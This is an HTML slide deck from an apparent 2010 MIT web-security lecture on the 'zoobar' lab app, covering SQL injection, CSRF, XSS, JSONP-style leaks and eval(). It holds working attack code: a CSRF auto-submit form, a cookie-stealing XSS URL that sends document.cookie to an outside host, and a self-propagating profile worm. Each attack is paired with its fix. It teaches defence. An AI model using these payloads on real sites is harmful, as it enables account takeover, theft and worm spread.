@@ -1,0 +1,478 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<title>Security in Web Applications</title>
+<!-- metadata -->
+<meta name="generator" content="S5" />
+<meta name="version" content="S5 1.1" />
+<meta name="presdate" content="January 06, 2010" />
+<meta name="author" content="Victor Costan" />
+<meta name="company" content="Massachusetts Institute of Technology" />
+<!-- configuration parameters -->
+<meta name="defaultView" content="slideshow" />
+<meta name="controlVis" content="hidden" />
+<!-- style sheet links -->
+<link rel="stylesheet" href="../assets/ui/default/slides.css" type="text/css" media="projection" id="slideProj" />
+<link rel="stylesheet" href="../assets/ui/default/outline.css" type="text/css" media="screen" id="outlineStyle" />
+<link rel="stylesheet" href="../assets/stylesheets/print.css" type="text/css" media="print" id="slidePrint" />
+<link rel="stylesheet" href="../assets/ui/default/opera.css" type="text/css" media="projection" id="operaFix" />
+<link rel="stylesheet" href="../assets/stylesheets/pressie.css" type="text/css" />
+
+<!-- S5 JS -->
+<script src="../assets/ui/default/slides.js" type="text/javascript"></script>
+
+<!-- Syntax Highlighter -->
+<link rel="stylesheet"  href="../assets/dp.SyntaxHighlighter/styles/shCore.css"></link>
+<link rel="stylesheet"  href="../assets/dp.SyntaxHighlighter/styles/shThemeEclipse.css"></link>
+
+</head>
+<body>
+
+<div class="layout">
+<div id="controls"><!-- DO NOT EDIT --></div>
+<div id="currentSlide"><!-- DO NOT EDIT --></div>
+<div id="header"></div>
+<div id="footer">
+<h2>Copyright © 2010 Victor Costan</h2>
+</div>
+
+</div>
+
+
+<div class="presentation">
+  
+<div class="slide"><h1>Integration Vulnerabilities</h1>
+<p>Integration vulnerabilities are not obvious from the application&#8217;s logic. They happen when complex systems interact in unexpected ways.</p>
+<ul>
+	<li>Web applications use a big soup of technologies</li>
+	<li>Each integration point is a source of vulnerabilities</li>
+</ul>
+<p>Solution</p>
+<ul>
+	<li>Learn about security implications when integrating a new technology</li>
+</ul>
+</div>
+<div class="slide"><h1><span class="caps">SQL</span> Injection</h1>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">    $username = $_POST['login_username'];
+    $sql = "SELECT * FROM Person WHERE (Username = '$username') ";
+    $rs = $db-&gt;executeQuery($sql);</pre></div>
+<p>The code above leads to pwnage.</p>
+<ul>
+	<li><span class="caps">SQL</span> Injection 1: <code>'</code> and <code>"</code> escape out of the string</li>
+	<li><span class="caps">SQL</span> Injection 2: <code>;</code> separates instructions, <code>--</code> comments out the rest of the line</li>
+	<li><span class="caps">SQL</span> Injection 3: <code>OR 1=1</code> kills <code>WHERE</code> clauses, <code>DROP ALL TABLES</code>  kills your database</li>
+</ul>
+</div>
+<div class="slide"><h1><span class="caps">SQL</span> Injection Fixes</h1>
+<ul>
+	<li>Escape every input that came in touch with the user. When in doubt, escape.</li>
+	<li>Escaping: enclose strings in single quotes <code>'</code>, call <code>addslashes</code></li>
+	<li>Higher-level APIs (e.g. ORMs) escape automatically. Use them whenever possible.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">    $sql = "SELECT Username FROM Users WHERE Username='" .
+           addslashes($username) . "'";
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_fixed/svc-users.php">code/zoobar_fixed/svc-users.php</a></div>
+</div>
+<div class="slide"><h1><span class="caps">SQL</span> Injection: Featured on <span class="caps">XKCD</span></h1>
+<p><img src="images/xkcd_327.png" style="width: 100%;" alt="" /></p>
+<ul>
+	<li>Very embarrassing: did you get pwned by someone who read xkcd?!</li>
+</ul>
+</div>
+<div class="slide"><h1>Source Code Leak</h1>
+<ul>
+	<li>On <code>scripts.mit.edu</code> make sure your <span class="caps">AFS</span> permissions are set correctly. Ask a friend to try to <code>cd</code> into your locker.</li>
+</ul>
+<table>
+	<tr>
+		<td> Serverity </td>
+		<td> Problem                                   </td>
+		<td> Workaround                                      </td>
+	</tr>
+	<tr>
+		<td> low       </td>
+		<td> database credentials in source            </td>
+		<td> use firewall to prevent external connections    </td>
+	</tr>
+	<tr>
+		<td> medium    </td>
+		<td> other credentials (e.g. Facebook <span class="caps">API</span> key) </td>
+		<td> ask partners to restrict <span class="caps">API</span> access to your IPs </td>
+	</tr>
+	<tr>
+		<td> high      </td>
+		<td> your source code is embarrassing          </td>
+		<td> fix the damn file permissions                   </td>
+	</tr>
+</table>
+</div>
+<div class="slide"><h1>Web Security: Model Overview</h1>
+<p>Problem</p>
+<ul>
+	<li><span class="caps">HTTP</span> is stateless: each request is independent.</li>
+	<li>State is simulated via a cookie jar.</li>
+</ul>
+<p>Threat Model</p>
+<ol>
+	<li>User visits site B (e.g. Twitter) and logs in</li>
+	<li>User visits site A (e.g. Facebook)</li>
+	<li>Site A renders code that accesses data from site B</li>
+</ol>
+</div>
+<div class="slide"><h1>Web Security: Same-Origin Policy</h1>
+<p>Firewalls sites, so site A cannot interfere with site B</p>
+<ul>
+	<li>Site A does not receive cookies from site B</li>
+	<li>JavaScript from A cannot read site B&#8217;s cookie jar</li>
+	<li>JavaScript from A cannot access the <span class="caps">DOM</span> of pages from site B</li>
+	<li>JavaScript from A cannot send an <code>XmlHttpRequest</code> to B</li>
+</ul>
+</div>
+<div class="slide"><h1>Web Security: the Mashup Hole</h1>
+<p><span class="caps">DOM</span> elements can access data from any <span class="caps">URL</span>.</p>
+<table>
+	<tr>
+		<td> Tool       </td>
+		<td> Motivation                              </td>
+		<td> Attack                                   </td>
+	</tr>
+	<tr>
+		<td> <code>&lt;img&gt;</code>    </td>
+		<td> CDNs (Content Distribution Networks)    </td>
+		<td> Issue arbitrary <span class="caps">GET</span> requests.            </td>
+	</tr>
+	<tr>
+		<td> <code>&lt;form&gt;</code>   </td>
+		<td> CDNs, Mash-ups (e.g. payment forms)     </td>
+		<td> Issue arbitrary requests.                </td>
+	</tr>
+	<tr>
+		<td> <code>&lt;script&gt;</code> </td>
+		<td> CDNs, Mash-ups (e.g. Google Map widget) </td>
+		<td> Mash-up provider injects arbitrary code. </td>
+	</tr>
+	<tr>
+		<td> <span class="caps">JSONP</span>      </td>
+		<td> Data from another server.               </td>
+		<td> Data without user&#8217;s consent.             </td>
+	</tr>
+</table>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span>: Cross-Site Request Forgery</h1>
+<ol>
+	<li>Assume the victim is logged into target site. Assumption usually holds for Facebook, Twitter, Gmail, etc.</li>
+	<li>Convince victim to visit page with your code.</li>
+	<li>Issue <span class="caps">HTTP</span> requests to target site. The requests use the victim&#8217;s cookie jar.</li>
+</ol>
+<ul>
+	<li>Myth: people don&#8217;t visit arbitrary URLs; Twitter + <code>bit.ly</code> URLs</li>
+	<li>Myth: <span class="caps">CSRF</span> attacks are hard to mount</li>
+	<li>Myth: only <code>GET</code> requests are vulnerable to <span class="caps">CSRF</span></li>
+</ul>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Howto 1/4: Study the Target</h1>
+<ul>
+	<li>Most Web applications have a freemium model; attacker can get an account on the system for free.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="html:nogutter:nocontrols">&lt;form method=POST name=transferform
+  action="&lt;?php echo $_SERVER['PHP_SELF']?&gt;"&gt;
+&lt;p&gt;Send &lt;input name=zoobars type=text value="&lt;?php 
+  echo $_POST['zoobars']; 
+?&gt;" size=5&gt; zoobars&lt;/p&gt;
+&lt;p&gt;to &lt;input name=recipient type=text value="&lt;?php 
+  echo $_POST['recipient']; 
+?&gt;" size=10&gt;&lt;/p&gt;
+&lt;input type=submit name=submission value="Send"&gt;
+&lt;/form&gt;
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar/transfer.php">code/zoobar/transfer.php</a></div>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Howto 2/4: Extract the Request</h1>
+<ul>
+	<li>Easy: use Firebug&#8217;s <span class="caps">DOM</span> inspector</li>
+	<li>Trivial: use Firebug&#8217;s Net panel</li>
+</ul>
+<table>
+	<tr>
+		<td> Form action  </td>
+		<td> <code>/transfer.php</code> </td>
+	</tr>
+	<tr>
+		<td> Form method  </td>
+		<td> <code>POST</code>          </td>
+	</tr>
+	<tr>
+		<td> <code>zoobars</code>    </td>
+		<td> number          </td>
+	</tr>
+	<tr>
+		<td> <code>recipient</code>  </td>
+		<td> user name       </td>
+	</tr>
+	<tr>
+		<td> <code>submission</code> </td>
+		<td> <code>Send</code>          </td>
+	</tr>
+</table>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Howto 3/4: Set Up a Form</h1>
+<div class="code-normal"><pre name="code" class="html:nogutter:nocontrols">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://localhost/zoobar/transfer.php" id="post_form"
+          method="post" enctype="application/x-www-form-urlencoded"&gt;
+      &lt;input type="hidden" name="recipient" value="attacker" /&gt;
+      &lt;input type="hidden" name="zoobars" value="10" /&gt;
+      &lt;input type="hidden" name="submission" value="Send" /&gt;
+    &lt;/form&gt;
+    &lt;iframe id="form_target" name="form_target" style="visibility: hidden;"&gt;      
+    &lt;/iframe&gt;
+    
+    &lt;script type="text/javascript" src="csrf.js"&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/csrf.html">code/zoobar_attacks/csrf.html</a></div>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Howto 4/4: Auto-Submit the Form</h1>
+<div class="code-normal"><pre name="code" class="js:nogutter:nocontrols">var frame = document.getElementById('form_target'); 
+var form = document.getElementById('post_form');
+form.target = frame.name;
+frame.addEventListener('load', function() {
+	window.location = "http://pdos.csail.mit.edu/6.893/2009/";
+}, false);
+form.submit();
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/csrf.js">code/zoobar_attacks/csrf.js</a></div>
+<p>Bonus: Stealth Attack</p>
+<ol>
+	<li>Submit the form result to an <code>&lt;iframe&gt;</code></li>
+	<li>Redirect to safe page after the form is submitted</li>
+</ol>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Fix</h1>
+<ul>
+	<li>Add a <em>hard to guess</em> token to each non-<code>GET</code> request (with side-effects).</li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">function check_csrf_token() {
+	global $csrf_token;	
+	if ($_POST['_csrf_token'] != $csrf_token) {
+		die();
+	}
+}
+function csrf_form_field() {
+	global $csrf_token;
+	echo '&lt;input type="hidden" name="_csrf_token" value="' . $csrf_token . '" /&gt;';
+}
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_fixed/includes/csrf.php">code/zoobar_fixed/includes/csrf.php</a></div>
+</div>
+<div class="slide"><h1><span class="caps">CSRF</span> Fix</h1>
+<ul>
+	<li>Simple implementation: random token stored in cookie.</li>
+	<li>The secret is an extra defense in case the random generator is defeated.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">if (empty($_COOKIE['csrf_base']) || !isset($_COOKIE['csrf_base'])) {
+	$csrf_base = sha1("csrf" . mt_rand() . "_" . getmypid() . "_" .
+	                  microtime(true));
+	setcookie('csrf_base', $csrf_base);
+}
+else {
+  $csrf_base = $_COOKIE['csrf_base'];
+}
+$csrf_token = sha1($_COOKIE['csrf_base'] .
+                   "hduM3POw/NCTmMfy7vKZxdDjupKnuK6r9");
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_fixed/includes/csrf.php">code/zoobar_fixed/includes/csrf.php</a></div>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span>: Cross-Site Scripting</h1>
+<ol>
+	<li>Make the target site render your JavaScript from their server.</li>
+	<li>Same-Origin Policy does not apply anymore.</li>
+</ol>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span> Howto 1/3: Find Vulnerability</h1>
+<ul>
+	<li>Test forms with <code>"</code>, <span class="caps">HTML</span> tags, <code>javascript:</code> links, etc.</li>
+	<li>Automated tools (fuzzers) exist.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols"></pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar/users.php">code/zoobar/users.php</a></div>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span> Howto 2/3: Inject an alert()</h1>
+<ul>
+	<li><code>alert()</code> proves that you can run JavaScript, has very few moving parts.</li>
+	<li>Once you have the <code>alert()</code>, you can use standard payloads and tools to finish the attack.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="ruby:nogutter:nocontrols">http://localhost/zoobar/users.php?user="&gt;&lt;script type="text/javascript"&gt;alert('Boom');&lt;/script&gt;&lt;div style="display:none;" xx="</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/xss_alert.url">code/zoobar_attacks/xss_alert.url</a></div>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span> Howto 3/3: Full Attack</h1>
+<ul>
+	<li>Generate <span class="caps">DOM</span> elements to submit cookies to your site.</li>
+	<li>Hide any validation errors that can point to your attack.</li>
+</ul>
+<div class="code-normal"><pre name="code" class="ruby:nogutter:nocontrols">def session_exploit_js
+  url = 'http://pdos.csail.mit.edu/6.893/2009/labs/lab3/sendmail.php'
+  addr = 'costan@mit.edu'
+  "(new Image()).src='#{url}?to=#{addr}&amp;payload='" +
+      "+encodeURIComponent(document.cookie)" +
+      "+'&amp;random='+Math.random();"
+end
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/xss_full.rb">code/zoobar_attacks/xss_full.rb</a></div>
+<div class="code-normal"><pre name="code" class="ruby:nogutter:nocontrols">http://localhost/zoobar/users.php?user=%22+size%3D%2210%22%3E%3Cstyle+type%3D%22text%2Fcss%22%3E.warning%7Bdisplay%3Anone%3B%7D%3C%2Fstyle%3E%3Cscript+type%3D%22text%2Fjavascript%22%3E%3C%21--%0A%28new+Image%28%29%29.src%3D%27http%3A%2F%2Fpdos.csail.mit.edu%2F6.893%2F2009%2Flabs%2Flab3%2Fsendmail.php%3Fto%3Dcostan%40mit.edu%26payload%3D%27%2BencodeURIComponent%28document.cookie%29%2B%27%26random%3D%27%2BMath.random%28%29%3B%0A%2F%2F+--%3E%3C%2Fscript%3E%3Cdiv+style%3D%22display%3Anone%3B%22+xx%3D%22
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/xss_full.url">code/zoobar_attacks/xss_full.url</a></div>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span> Defenses</h1>
+<p>Serve user content from another domain</p>
+<ul>
+	<li>Very cheap for its effectiveness</li>
+	<li>Domain name: $10, <span class="caps">HTTP</span> setup time: less than a day</li>
+</ul>
+<p>Escape strings originating from the user</p>
+<ul>
+	<li>If in doubt, escape. Rails 3 and Django default to escaping strings in views.</li>
+	<li>Do <em>not</em> store escaped user input in the database. Prevents changing the output format.</li>
+</ul>
+</div>
+<div class="slide"><h1><span class="caps">XSS</span> Defenses: Escaping</h1>
+<ul>
+	<li>Reject <code>javascript:</code> URLs (check against <code>/^https?\:/</code>)</li>
+	<li>Prefer <code>htmlentities()</code> to <code>htmlspecialchars()</code></li>
+	<li>Think about the difference between <code>ENT_COMPAT</code> and <code>ENT_QUOTES</code></li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols"> &lt;nobr&gt;User:
+ &lt;input type="text" name="user" value="&lt;?php 
+   echo htmlentities($_GET['user']); 
+ ?&gt;" size=10&gt;&lt;/nobr&gt;&lt;br&gt;
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_fixed/users.php">code/zoobar_fixed/users.php</a></div>
+</div>
+<div class="slide"><h1>Leaking Data via <span class="caps">AJAX</span></h1>
+<ul>
+	<li>Requests whose response fits nicely in a <code>&lt;script&gt;</code> tag.</li>
+	<li>Most common offender &#8211; <span class="caps">JSONP</span> for cross-domain scripting</li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">  var myZoobars = &lt;?php 
+     $sql = "SELECT Zoobars FROM Person WHERE Username='" .
+            addslashes($user-&gt;username) . "'";
+     $rs = $db-&gt;executeQuery($sql);
+     $balance = $rs-&gt;getValueByNr(0,0);
+     echo $balance &gt; 0 ? $balance : 0;
+  ?&gt;;
+  var div = document.getElementById("myZoobars");
+  if (div != null) {
+    div.innerHTML = myZoobars;
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar/zoobars.js.php">code/zoobar/zoobars.js.php</a></div>
+</div>
+<div class="slide"><h1>Leaking Data via Ajax: Exploit</h1>
+<ol>
+	<li>Set up data interceptor (JavaScript function or <span class="caps">DOM</span> object)</li>
+	<li>Use <code>&lt;script&gt;</code> tag to obtain the data.</li>
+	<li>Use the data.</li>
+</ol>
+<div class="code-normal"><pre name="code" class="html:nogutter:nocontrols">      &lt;div id="myZoobars"&gt;Nope&lt;/div&gt;
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/leak_xss.html">code/zoobar_attacks/leak_xss.html</a></div>
+<div class="code-normal"><pre name="code" class="html:nogutter:nocontrols">    &lt;script type="text/javascript"
+            src="http://localhost/zoobar/zoobars.js.php"&gt;
+    &lt;/script&gt;
+    &lt;script type="text/javascript"&gt;
+      if (document.getElementById('myZoobars').innerHTML == 'Nope') {
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/leak_xss.html">code/zoobar_attacks/leak_xss.html</a></div>
+</div>
+<div class="slide"><h1>eval() is Evil</h1>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">    $allowed_tags = 
+      '&lt;a&gt;&lt;br&gt;&lt;b&gt;&lt;h1&gt;&lt;h2&gt;&lt;h3&gt;&lt;h4&gt;&lt;i&gt;&lt;img&gt;&lt;li&gt;&lt;ol&gt;&lt;p&gt;&lt;strong&gt;&lt;table&gt;' .
+      '&lt;tr&gt;&lt;td&gt;&lt;th&gt;&lt;u&gt;&lt;ul&gt;&lt;em&gt;&lt;span&gt;';
+    $profile = strip_tags($profile, $allowed_tags);
+    $disallowed = 
+      'javascript:|window|eval|setTimeout|setInterval|target|'.
+      'onAbort|onBlur|onChange|onClick|onDblClick|'.
+      'onDragDrop|onError|onFocus|onKeyDown|onKeyPress|'.
+      'onKeyUp|onLoad|onMouseDown|onMouseMove|onMouseOut|'.
+      'onMouseOver|onMouseUp|onMove|onReset|onResize|'.
+      'onSelect|onSubmit|onUnload';
+    $profile = preg_replace("/$disallowed/i", " ", $profile);
+    echo "&lt;p id=profile&gt;$profile&lt;/p&gt;&lt;/div&gt;";
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar/users.php">code/zoobar/users.php</a></div>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">  var total = eval(document.getElementById('zoobars').className);
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar/users.php">code/zoobar/users.php</a></div>
+</div>
+<div class="slide"><h1>eval() is Evil</h1>
+<div class="code-normal"><pre name="code" class="html:nogutter:nocontrols">&lt;span id="zoobars" class="var d = document; var js = d.getElementById('javascript').innerHTML; var tag = d.createElement('script'); tag.setAttribute('type', 'text/javascript'); tag.innerHTML = js; d.body.appendChild(tag);"&gt;
+Headshot! 
+&lt;/span&gt;
+&lt;span style="display: none;" id="javascript"&gt;
+var formEncode = function(args) {
+  var output = '';
+  for (var name in args) {
+    if (output != '') { output += String.fromCharCode(38) }
+    output += encodeURIComponent(name) + '=' + encodeURIComponent(args[name]); 
+  }
+  return output;
+}
+
+var pay=new XMLHttpRequest();
+pay.open('POST', '/transfer.php');
+pay.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+pay.send(formEncode({recipient: 'attacker', zoobars: 1, submission: 'Send'}));
+
+var profile = document.getElementById('zoobars').parentNode.innerHTML;
+var copy=new XMLHttpRequest();
+copy.open('POST', '/index.php');
+copy.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+copy.send(formEncode({profile_update: profile, profile_submit: 'Save'}));
+&lt;/span&gt;</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_attacks/profile_worm.html">code/zoobar_attacks/profile_worm.html</a></div>
+</div>
+<div class="slide"><h1>eval() Is Evil: Fix</h1>
+<p>Use <code>eval()</code> very very sparingly.</p>
+<ul>
+	<li><code>eval()</code> should not be a shortcut for parsing code.</li>
+	<li>Numbers: <code>parseInt()</code>, <code>parseFloat()</code></li>
+	<li><span class="caps">JSON</span>: <code>JSON.parse()</code></li>
+</ul>
+<div class="code-normal"><pre name="code" class="php:nogutter:nocontrols">  var total = parseInt(document.getElementById('zoobars').className);
+</pre></div><div class="codeurl"><a href="txmt://open?url=file:///Users/victor/workspace370/security_in_webapps_slides/code/zoobar_fixed/users.php">code/zoobar_fixed/users.php</a></div>
+<p>This is for real: the previous attack was inspired from MySpace 2005 profile worm.</p>
+</div>
+<div class="slide"><h1>Infrastructure: Plug-ins</h1>
+<p>Famous 2009 Vulnerabilities</p>
+<ul>
+	<li>Windows Update compromises Firefox users by force-installing buggy .net plug-in</li>
+	<li>Adobe Flash vulnerability used to install trojans via drive-by <span class="caps">PDF</span> downloads</li>
+</ul>
+<p>Fixes</p>
+<ul>
+	<li>Restrict types of files users can upload to your site</li>
+	<li>Don&#8217;t require plug-ins, as much as possible</li>
+</ul>
+</div>
+<div class="slide"><h1>Infrastructure: Server Stack</h1>
+<p>Update all stack components that you own <span class="caps">ASAP</span>.</p>
+<ul>
+	<li>At a minimum, you&#8217;re responsible for upgrading your application framework</li>
+	<li>Good automated tests make platform updates quick and reliable. Best thing to have for 0-day vulnerabilities.</li>
+</ul>
+<p>Maintaining your own server?</p>
+<ul>
+	<li>Memorize the system&#8217;s update command (e.g. <code>sudo apt-get update; sudo apt-get dist-upgrade</code>)</li>
+	<li>Consider using <a href="http://www.ksplice.com/">Ksplice</a> for rebootless kernel updates</li>
+</ul></div>
+</div>
+
+<!-- Syntax Highlighter -->
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shCore.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shLegacy.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushCSharp.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushPhp.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushJScript.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushJava.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushVb.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushSql.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushXml.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushDelphi.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushPython.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushRuby.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushCss.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushCpp.js"></script>
+<script class="javascript" src="../assets/dp.SyntaxHighlighter/scripts/shBrushPlain.js"></script>
+<script language="javascript">
+SyntaxHighlighter.all();
+dp.SyntaxHighlighter.HighlightAll('code');
+</script>
+</body>
+</html>
